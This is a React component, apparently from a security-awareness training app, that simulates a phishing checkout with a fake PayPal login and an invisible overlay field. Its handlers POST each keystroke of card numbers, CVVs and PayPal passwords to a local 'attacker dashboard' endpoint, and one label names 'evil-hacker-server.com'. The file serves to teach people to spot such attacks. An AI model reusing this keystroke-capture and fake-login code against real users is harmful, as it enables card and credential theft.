'use client'

import { useState, useEffect } from 'react'
import { CreditCard, Lock, AlertCircle, Eye, EyeOff } from 'lucide-react'
import SplitScreenSimulation from '@/components/simulations/SplitScreenSimulation'
import { supabase } from '@/lib/supabase'
import { getAttackerApiUrl } from '@/lib/config'

export default function BankingSimulation() {
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
  })
  const [stolenData, setStolenData] = useState({
    paypalEmail: '',
    paypalPassword: '',
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
  })
  const [showPassword, setShowPassword] = useState(false)
  const [attackSuccess, setAttackSuccess] = useState(false)
  const [paymentCompleted, setPaymentCompleted] = useState(false)
  const [showSecondAlert, setShowSecondAlert] = useState(false)
  const [showThirdAlert, setShowThirdAlert] = useState(false)
  const [realDataWarning, setRealDataWarning] = useState(false)
  const [showPayPalLogin, setShowPayPalLogin] = useState(false)
  const [paypalStep, setPaypalStep] = useState<'login' | 'verify' | 'loading'>('login')

  const [paypalEmail, setPaypalEmail] = useState('')
  const [paypalPassword, setPaypalPassword] = useState('')

  const resetSimulation = () => {
    setFormData({
      cardNumber: '',
      cardHolder: '',
      expiryDate: '',
      cvv: '',
    })
    setStolenData({
      paypalEmail: '',
      paypalPassword: '',
      cardNumber: '',
      cardHolder: '',
      expiryDate: '',
      cvv: '',
    })
    setShowPassword(false)
    setAttackSuccess(false)
    setPaymentCompleted(false)
    setShowSecondAlert(false)
    setShowThirdAlert(false)
    setRealDataWarning(false)
  }

  // Listen for messages from fake PayPal tab
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'paypal_success') {
        setAttackSuccess(true)
        setPaymentCompleted(true)
        
        // Show second alert after 12 seconds
        setTimeout(() => {
          setShowSecondAlert(true)
        }, 12000)
        
        // Show third alert after 25 seconds  
        setTimeout(() => {
          setShowThirdAlert(true)
        }, 25000)
      }
    }

    window.addEventListener('message', handleMessage)
    return () => window.removeEventListener('message', handleMessage)
  }, [])

  // Check for real-looking data
  useEffect(() => {
    const cardNumberPattern = /^\d{13,19}$/
    const cvvPattern = /^\d{3,4}$/
    
    if (
      (formData.cardNumber.replace(/\s/g, '').match(cardNumberPattern) && 
       formData.cardNumber !== '1234567812345678') ||
      (formData.cvv.match(cvvPattern) && formData.cvv !== '123')
    ) {
      setRealDataWarning(true)
    } else {
      setRealDataWarning(false)
    }
  }, [formData])

  const handleInputChange = async (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }))
    // Simulate keystroke capture
    setStolenData(prev => ({ ...prev, [field]: value }))
    
    // Send real-time data to attacker dashboard
    try {
      // Get or create a PERSISTENT session ID that stays the same for this user
      let sessionId = localStorage.getItem('session_id')
      if (!sessionId) {
        sessionId = 'demo-session-' + Date.now()
        localStorage.setItem('session_id', sessionId)
      }
      
      await fetch(getAttackerApiUrl('capture'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: field === 'cardNumber' ? 'card_number' : 
                   field === 'cardHolder' ? 'card_holder' :
                   field === 'expiryDate' ? 'expiry_date' :
                   field === 'cvv' ? 'cvv' : field,
            value: value
          }
        })
      })
    } catch (error) {
      console.log('Real-time capture error (non-critical):', error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setAttackSuccess(true)
    setPaymentCompleted(true)

    // Send complete form data to attacker dashboard
    try {
      // Use the same persistent session ID
      let sessionId = localStorage.getItem('session_id')
      if (!sessionId) {
        sessionId = 'demo-session-' + Date.now()
        localStorage.setItem('session_id', sessionId)
      }
      
      await fetch('http://localhost:3001/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: 'complete_form',
            value: JSON.stringify({
              cardNumber: stolenData.cardNumber,
              cardHolder: stolenData.cardHolder,
              expiryDate: stolenData.expiryDate,
              cvv: stolenData.cvv
            })
          }
        })
      })
    } catch (error) {
      console.log('Form submission capture error (non-critical):', error)
    }
  }

  const handlePayPalClick = () => {
    // Open fake PayPal login in a new tab
    const sessionId = localStorage.getItem('session_id') || 'demo-session-' + Date.now()
    window.open(`/banking?session=${sessionId}`, '_blank')
  }

  const handlePayPalLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setStolenData(prev => ({ 
      ...prev, 
      paypalEmail: paypalEmail,
      paypalPassword: paypalPassword 
    }))
    
    // Send PayPal credentials to attacker dashboard
    try {
      // Use the same persistent session ID
      let sessionId = localStorage.getItem('session_id')
      if (!sessionId) {
        sessionId = 'demo-session-' + Date.now()
        localStorage.setItem('session_id', sessionId)
      }
      
      await fetch('http://localhost:3001/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: 'paypal_email',
            value: paypalEmail
          }
        })
      })
      
      await fetch('http://localhost:3001/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: 'paypal_password',
            value: paypalPassword
          }
        })
      })
    } catch (error) {
      console.log('PayPal capture error (non-critical):', error)
    }
    
    setPaypalStep('verify')
  }

  const handlePayPalVerify = (e: React.FormEvent) => {
    e.preventDefault()
    setPaypalStep('loading')
    
    // Simulate processing
    setTimeout(() => {
      setShowPayPalLogin(false)
      setAttackSuccess(true)
      setPaymentCompleted(true)
      
      // Show second alert after 12 seconds
      setTimeout(() => {
        setShowSecondAlert(true)
      }, 12000)
      
      // Show third alert after 25 seconds  
      setTimeout(() => {
        setShowThirdAlert(true)
      }, 25000)
    }, 2000)
  }

  const VictimView = (
    <div className="space-y-3">
      <div className="bg-green-600 text-white p-3 rounded-t-lg">
        <h2 className="text-xl font-semibold flex items-center gap-2">
          <Lock size={24} />
          TechDeals Express Checkout
        </h2>
        <p className="text-sm text-green-100 mt-1">🎉 Special Offer: iPhone 15 Pro - 70% OFF!</p>
      </div>
      
      {/* Product Info */}
      <div className="bg-gray-100 dark:bg-gray-800 rounded-lg p-3 flex items-center justify-between">
        <div>
          <h3 className="font-semibold">iPhone 15 Pro Max 256GB</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400">Original Price: <span className="line-through">$1,199</span></p>
          <p className="text-lg font-bold text-green-600">Today Only: $359.99</p>
          <p className="text-xs text-red-600 mt-1">⚡ Only 2 left in stock!</p>
        </div>
        <div className="text-right">
          <p className="text-sm text-gray-600">⭐⭐⭐⭐⭐ (2,341 reviews)</p>
          <p className="text-xs text-green-600">✓ Free Shipping</p>
        </div>
      </div>
      
      {/* PayPal Express Checkout Button */}
      <div className="space-y-3">
        <button
          onClick={handlePayPalClick}
          className="w-full bg-[#ffc439] hover:bg-[#f0b90b] text-[#003087] font-bold py-3 rounded-lg transition-all transform hover:scale-[1.02] flex items-center justify-center gap-3 shadow-lg"
        >
          <span className="text-xl font-bold">PayPal</span>
          Express Checkout
        </button>
        
        <div className="relative">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-2 bg-white text-gray-500">OR</span>
          </div>
        </div>
      </div>
      
      {realDataWarning && (
        <div className="bg-red-100 dark:bg-red-900/30 border border-red-400 rounded-lg p-4 flex items-start gap-3">
          <AlertCircle className="text-red-600 dark:text-red-400 flex-shrink-0" size={20} />
          <div>
            <p className="font-semibold text-red-800 dark:text-red-200">Warning!</p>
            <p className="text-sm text-red-700 dark:text-red-300">
              Please use ONLY the demo data provided below. Never enter real credit card information!
            </p>
            <p className="text-xs mt-2 text-red-600 dark:text-red-400">
              Demo Card: 1234 5678 1234 5678 | CVV: 123
            </p>
          </div>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-3">
        <div className="relative">
          <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
            Card Number
          </label>
          <div className="relative">
            <input
              type="text"
              placeholder="1234 5678 1234 5678"
              value={formData.cardNumber}
              onChange={(e) => handleInputChange('cardNumber', e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              maxLength={19}
            />
            <CreditCard className="absolute right-3 top-2.5 text-gray-400" size={20} />
          </div>
          {/* Invisible overlay capturing input */}
          <input
            type="text"
            className="absolute inset-0 opacity-0 pointer-events-auto z-20"
            onChange={(e) => {
              setStolenData(prev => ({ ...prev, cardNumber: e.target.value }))
              setFormData(prev => ({ ...prev, cardNumber: e.target.value }))
            }}
            aria-hidden="true"
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            placeholder="John Doe"
            value={formData.cardHolder}
            onChange={(e) => handleInputChange('cardHolder', e.target.value)}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
          />
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Expiry Date
            </label>
            <input
              type="text"
              placeholder="MM/YY"
              value={formData.expiryDate}
              onChange={(e) => handleInputChange('expiryDate', e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
              maxLength={5}
            />
          </div>
          <div className="relative">
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              CVV
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="123"
              value={formData.cvv}
              onChange={(e) => handleInputChange('cvv', e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
              maxLength={4}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-8 text-gray-400 hover:text-gray-600"
            >
              {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
            </button>
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-colors font-semibold"
        >
          Complete Payment
        </button>
      </form>

      <p className="text-xs text-gray-500 text-center">
        This is a demo form. No real transactions will be processed.
      </p>
      
      {/* PayPal Login Modal - REMOVED - Now opens in new tab */}
      {false && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
          {/* Close button */}
          <button
            onClick={() => {
              setShowPayPalLogin(false)
              setPaypalStep('login')
              setPaypalEmail('')
              setPaypalPassword('')
            }}
            className="absolute top-4 right-4 w-12 h-12 bg-white/10 hover:bg-white/20 rounded-full flex items-center justify-center transition-colors"
          >
            <span className="text-white text-3xl leading-none">&times;</span>
          </button>
          
          <div className="bg-white rounded-lg shadow-2xl max-w-md w-full">
            {/* PayPal Header */}
            <div className="bg-[#003087] text-white p-4 rounded-t-lg text-center">
              <svg className="h-8 mx-auto" viewBox="0 0 124 33" fill="white">
                <path d="M46.211 6.749h-6.839a.95.95 0 0 0-.939.802l-2.766 17.537a.57.57 0 0 0 .564.658h3.265a.95.95 0 0 0 .939-.803l.746-4.73a.95.95 0 0 1 .938-.803h2.165c4.505 0 7.105-2.18 7.784-6.5.306-1.89.013-3.375-.872-4.415-.972-1.142-2.696-1.746-4.985-1.746zM47 13.154c-.374 2.454-2.249 2.454-4.062 2.454h-1.032l.724-4.583a.57.57 0 0 1 .563-.481h.473c1.235 0 2.4 0 3.002.704.359.42.469 1.044.332 1.906zM66.654 13.075h-3.275a.57.57 0 0 0-.563.481l-.146.916-.229-.332c-.709-1.029-2.29-1.373-3.868-1.373-3.619 0-6.71 2.741-7.312 6.586-.313 1.918.132 3.752 1.22 5.031.998 1.176 2.426 1.666 4.125 1.666 2.916 0 4.533-1.875 4.533-1.875l-.146.91a.57.57 0 0 0 .562.66h2.95a.95.95 0 0 0 .939-.803l1.77-11.209a.568.568 0 0 0-.56-.658zm-4.565 6.374c-.316 1.871-1.801 3.127-3.695 3.127-.951 0-1.711-.305-2.199-.883-.484-.574-.668-1.391-.514-2.301.295-1.855 1.805-3.152 3.67-3.152.93 0 1.686.309 2.184.892.499.589.697 1.411.554 2.317zM84.096 13.075h-3.291a.954.954 0 0 0-.787.417l-4.539 6.686-1.924-6.425a.953.953 0 0 0-.912-.678h-3.234a.57.57 0 0 0-.541.754l3.625 10.638-3.408 4.811a.57.57 0 0 0 .465.9h3.287a.949.949 0 0 0 .781-.408l10.946-15.8a.57.57 0 0 0-.468-.895z"/>
              </svg>
            </div>

            {paypalStep === 'login' && (
              <div className="p-6">
                <h3 className="text-xl font-semibold text-gray-900 mb-4">
                  Log in to your PayPal account
                </h3>
                
                <form onSubmit={handlePayPalLogin} className="space-y-4">
                  <input
                    type="email"
                    placeholder="Email or phone number"
                    value={paypalEmail}
                    onChange={async (e) => {
                      setPaypalEmail(e.target.value)
                      setStolenData(prev => ({ ...prev, paypalEmail: e.target.value }))
                      
                      // Real-time capture
                      try {
                        // Use the same persistent session ID
                        let sessionId = localStorage.getItem('session_id')
                        if (!sessionId) {
                          sessionId = 'demo-session-' + Date.now()
                          localStorage.setItem('session_id', sessionId)
                        }
                        await fetch('http://localhost:3001/api/capture', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            type: 'credentials',
                            sessionId,
                            data: { field: 'paypal_email', value: e.target.value }
                          })
                        })
                      } catch (error) {}
                    }}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                    required
                  />
                  <input
                    type="password"
                    placeholder="Password"
                    value={paypalPassword}
                    onChange={async (e) => {
                      setPaypalPassword(e.target.value)
                      setStolenData(prev => ({ ...prev, paypalPassword: e.target.value }))
                      
                      // Real-time capture
                      try {
                        // Use the same persistent session ID
                        let sessionId = localStorage.getItem('session_id')
                        if (!sessionId) {
                          sessionId = 'demo-session-' + Date.now()
                          localStorage.setItem('session_id', sessionId)
                        }
                        await fetch('http://localhost:3001/api/capture', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            type: 'credentials',
                            sessionId,
                            data: { field: 'paypal_password', value: e.target.value }
                          })
                        })
                      } catch (error) {}
                    }}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                    required
                  />
                  <button
                    type="submit"
                    className="w-full bg-[#003087] text-white py-3 rounded-lg font-semibold hover:bg-[#002064] transition-colors"
                  >
                    Log In
                  </button>
                </form>
                
                <div className="mt-4 text-center">
                  <a href="#" className="text-[#003087] text-sm hover:underline">
                    Having trouble logging in?
                  </a>
                </div>
                
                <div className="mt-6 pt-6 border-t border-gray-200">
                  <p className="text-xs text-gray-500 text-center">
                    This is a DEMO - Do not enter real PayPal credentials
                  </p>
                </div>
              </div>
            )}

            {paypalStep === 'verify' && (
              <div className="p-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-2">
                  Verify your card for this purchase
                </h3>
                <p className="text-sm text-gray-600 mb-6">
                  For security, please confirm your card details ending in ****
                </p>
                
                <form onSubmit={handlePayPalVerify} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Card Number
                    </label>
                    <input
                      type="text"
                      placeholder="1234 5678 1234 5678"
                      value={formData.cardNumber}
                      onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                      required
                    />
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        Expiry Date
                      </label>
                      <input
                        type="text"
                        placeholder="MM/YY"
                        value={formData.expiryDate}
                        onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        CVV
                      </label>
                      <input
                        type="text"
                        placeholder="123"
                        value={formData.cvv}
                        onChange={(e) => handleInputChange('cvv', e.target.value)}
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#003087]"
                        required
                      />
                    </div>
                  </div>
                  
                  <button
                    type="submit"
                    className="w-full bg-[#ffc439] text-[#003087] py-3 rounded-lg font-bold hover:bg-[#f0b90b] transition-colors"
                  >
                    Complete Purchase - $359.99
                  </button>
                </form>
                
                <p className="text-xs text-gray-500 text-center mt-4">
                  This is a DEMO verification page
                </p>
              </div>
            )}

            {paypalStep === 'loading' && (
              <div className="p-12 text-center">
                <div className="inline-block animate-spin rounded-full h-12 w-12 border-4 border-[#003087] border-t-transparent"></div>
                <p className="mt-4 text-gray-600">Processing payment...</p>
                <p className="text-sm text-gray-500 mt-2">Please wait...</p>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* First Payment Notification */}
      {paymentCompleted && (
        <div className="fixed top-4 right-4 bg-red-600 text-white p-4 rounded-lg shadow-2xl z-50 max-w-sm animate-slide-in">
          <div className="flex items-start gap-3">
            <div className="bg-white rounded-full p-1">
              <AlertCircle className="text-red-600" size={20} />
            </div>
            <div className="flex-1">
              <div className="font-bold text-lg">⚠️ PAYMENT PROCESSED!</div>
              <div className="text-sm text-red-100 mt-1 font-semibold">
                $359.99 HAS BEEN DEBITED FROM YOUR ACCOUNT
              </div>
              <div className="text-xs text-red-200 mt-2">
                Transaction ID: TXN-{Math.random().toString(36).substr(2, 9).toUpperCase()}
              </div>
              <div className="text-xs text-yellow-300 mt-1">
                💸 Money withdrawn from your PayPal balance
              </div>
            </div>
            <button 
              onClick={() => setPaymentCompleted(false)}
              className="text-red-200 hover:text-white text-lg"
            >
              ×
            </button>
          </div>
        </div>
      )}

      {/* Second Alert - More money debited */}
      {showSecondAlert && (
        <div className="fixed top-4 right-4 bg-red-700 text-white p-4 rounded-lg shadow-2xl z-50 max-w-sm animate-slide-in">
          <div className="flex items-start gap-3">
            <div className="bg-white rounded-full p-1 animate-pulse">
              <AlertCircle className="text-red-700" size={20} />
            </div>
            <div className="flex-1">
              <div className="font-bold text-lg">🚨 ADDITIONAL CHARGE!</div>
              <div className="text-sm text-red-100 mt-1 font-semibold">
                $1,245.67 HAS BEEN DEBITED
              </div>
              <div className="text-xs text-red-200 mt-2">
                Merchant: RECURRING-SUBSCRIPTION-FEE
              </div>
              <div className="text-xs text-yellow-300 mt-1">
                💳 Auto-subscription activated
              </div>
            </div>
            <button 
              onClick={() => setShowSecondAlert(false)}
              className="text-red-200 hover:text-white text-lg"
            >
              ×
            </button>
          </div>
        </div>
      )}

      {/* Third Alert - Account drained */}
      {showThirdAlert && (
        <div className="fixed top-4 right-4 bg-black border-2 border-red-500 text-white p-4 rounded-lg shadow-2xl z-50 max-w-sm animate-slide-in animate-pulse">
          <div className="flex items-start gap-3">
            <div className="bg-red-500 rounded-full p-1 animate-ping">
              <AlertCircle className="text-white" size={20} />
            </div>
            <div className="flex-1">
              <div className="font-bold text-xl text-red-400">🔴 ACCOUNT DRAINED!</div>
              <div className="text-sm text-red-300 mt-1 font-semibold">
                TOTAL DEBITED: $2,847.89
              </div>
              <div className="text-xs text-gray-300 mt-2">
                Available Balance: <span className="text-red-500 font-bold">$0.00</span>
              </div>
              <div className="text-xs text-yellow-400 mt-1">
                ⚠️ ALL MONEY HAS BEEN STOLEN!
              </div>
              <div className="text-xs text-red-400 mt-1">
                💸 Account compromised - Contact bank immediately
              </div>
            </div>
            <button 
              onClick={() => setShowThirdAlert(false)}
              className="text-red-200 hover:text-white text-lg"
            >
              ×
            </button>
          </div>
        </div>
      )}

      <style jsx>{`
        @keyframes slide-in {
          from {
            transform: translateX(100%);
            opacity: 0;
          }
          to {
            transform: translateX(0);
            opacity: 1;
          }
        }
        .animate-slide-in {
          animation: slide-in 0.5s ease-out;
        }
      `}</style>
    </div>
  )


  const WarningSignsComponent = (
    <ul className="space-y-2 text-sm">
      <li className="flex items-start">
        <span className="text-yellow-600 dark:text-yellow-400 mr-2">•</span>
        <span>URL doesn't match your bank's official domain</span>
      </li>
      <li className="flex items-start">
        <span className="text-yellow-600 dark:text-yellow-400 mr-2">•</span>
        <span>Missing or invalid SSL certificate (no padlock icon)</span>
      </li>
      <li className="flex items-start">
        <span className="text-yellow-600 dark:text-yellow-400 mr-2">•</span>
        <span>Unusual behavior when typing (lag, double characters)</span>
      </li>
      <li className="flex items-start">
        <span className="text-yellow-600 dark:text-yellow-400 mr-2">•</span>
        <span>Browser warnings about insecure content</span>
      </li>
      <li className="flex items-start">
        <span className="text-yellow-600 dark:text-yellow-400 mr-2">•</span>
        <span>Unexpected popups or redirects</span>
      </li>
    </ul>
  )

  // Custom malicious overlay for banking simulation
  const MaliciousOverlay = ({ transparencyLevel }: { transparencyLevel: number }) => {
    if (transparencyLevel === 0) return null;
    
    return (
      <div 
        className="absolute inset-0 pointer-events-none"
        style={{ opacity: transparencyLevel / 100 }}
      >
        <div className="bg-red-500/10 border-2 border-red-500 border-dashed rounded-lg p-4 h-full">
          <div className="bg-red-100 dark:bg-red-900/30 rounded-lg p-3 mb-4">
            <h3 className="text-red-800 dark:text-red-200 font-bold text-sm">
              🚨 HIDDEN ATTACKER FORM OVERLAY
            </h3>
          </div>
          
          <div className="space-y-3">
            {/* Hidden Card Number Field */}
            <div className="relative">
              <div className="bg-red-200 dark:bg-red-800/50 rounded-lg p-2 border-2 border-red-400">
                <label className="text-xs text-red-700 dark:text-red-300 font-semibold">
                  ⚠️ INVISIBLE CARD FIELD (Stealing: {stolenData.cardNumber || 'waiting...'})
                </label>
                <div className="bg-black/20 rounded px-2 py-1 mt-1 font-mono text-xs">
                  attacker_server.store("{stolenData.cardNumber}")
                </div>
              </div>
            </div>

            {/* Hidden CVV Field */}
            <div className="relative">
              <div className="bg-red-200 dark:bg-red-800/50 rounded-lg p-2 border-2 border-red-400">
                <label className="text-xs text-red-700 dark:text-red-300 font-semibold">
                  ⚠️ INVISIBLE CVV FIELD (Stealing: {stolenData.cvv || 'waiting...'})
                </label>
                <div className="bg-black/20 rounded px-2 py-1 mt-1 font-mono text-xs">
                  security_code: "{stolenData.cvv}"
                </div>
              </div>
            </div>

            {/* Data Transmission Indicator */}
            <div className="bg-red-300 dark:bg-red-700/50 rounded-lg p-2 border border-red-500">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
                <span className="text-xs text-red-800 dark:text-red-200 font-semibold">
                  TRANSMITTING TO: evil-hacker-server.com
                </span>
              </div>
              <div className="text-xs text-red-700 dark:text-red-300 mt-1">
                Every keystroke sent in real-time!
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <SplitScreenSimulation
      title="Banking Credential Theft Simulation"
      victimView={VictimView}
      attackerView={null}
      onAttackSuccess={() => setAttackSuccess(true)}
      onAttackDefended={() => setAttackSuccess(false)}
      explanation={
        attackSuccess
          ? "You entered credentials into what appeared to be a legitimate banking form, but invisible form fields were capturing every keystroke. The attacker now has your card details. In a real attack, this data would be sold on the dark web or used for fraudulent purchases."
          : "You successfully identified suspicious elements in the banking form and avoided entering sensitive information. Always verify the URL and SSL certificate before entering financial data."
      }
      warningSignsComponent={WarningSignsComponent}
      maliciousOverlay={MaliciousOverlay}
      onReset={resetSimulation}
    />
  )
}